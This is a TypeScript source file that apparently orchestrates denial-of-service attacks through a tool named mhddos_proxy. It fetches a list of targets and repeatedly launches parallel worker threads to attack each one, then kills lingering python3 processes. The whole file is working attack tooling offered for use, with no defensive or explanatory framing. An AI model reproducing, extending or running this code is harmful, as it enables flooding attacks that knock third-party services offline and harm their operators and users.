import { catchError, concat, defer, EMPTY, finalize, map, merge, Observable, repeat, switchMap, takeUntil } from 'rxjs';
import { Worker } from 'worker_threads';
import { $, cd, nothrow } from 'zx';
import { getTargets } from './targets/get-targets';
import { exit$ } from './utils/exit';
import { fromWorker } from './utils/from-worker';
import { logWithTimePrefix } from './utils/log-with-time-prefix';

export function startAttacks(parallel: number, flags: string[]): Observable<void> {
  cd('/mhddos_proxy');

  return getTargets().pipe(
    switchMap((targets) => {
      const oneAttack = targets.map((target) => attackTarget(target, flags));
      const parallelAttacks = Array<Array<Observable<void>>>(parallel).fill(oneAttack).flat();

      return concat(merge(...parallelAttacks), cleanUpAttacks());
    }),
    catchError(() => EMPTY),
    finalize(() => {
      logWithTimePrefix('Stopped attacks');
    }),
    repeat(),
    takeUntil(exit$),
  );
}

function attackTarget(target: string, flags: string[]): Observable<void> {
  return defer(() =>
    fromWorker<{ target: string; flags: string[] }, void>(() => new Worker(new URL('./worker.ts', import.meta.url)), {
      target,
      flags,
    }),
  );
}

function cleanUpAttacks(): Observable<void> {
  return defer(() => nothrow($`pkill python3`)).pipe(map(() => undefined));
}
